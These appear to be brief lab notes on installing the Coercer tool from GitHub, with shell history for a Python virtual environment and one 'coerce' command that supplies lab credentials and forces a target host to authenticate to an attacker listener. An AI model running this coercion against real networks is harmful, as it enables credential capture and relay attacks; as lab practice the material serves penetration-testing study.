https://github.com/p0dalirius/Coercer.git

git clone https://github.com/p0dalirius/Coercer.git

```
  103  python3 -m venv virtualpythonenv
  104  dir
  105  virtualpythonenv/bin/activate
  106  source virtualpythonenv/bin/activate
  107  pip install coercer



Coerce Mode

coercer coerce -u 'joe.snow' -p 'iknownothing' --target 192.168.56.12 --listener-ip 192.168.56.1

```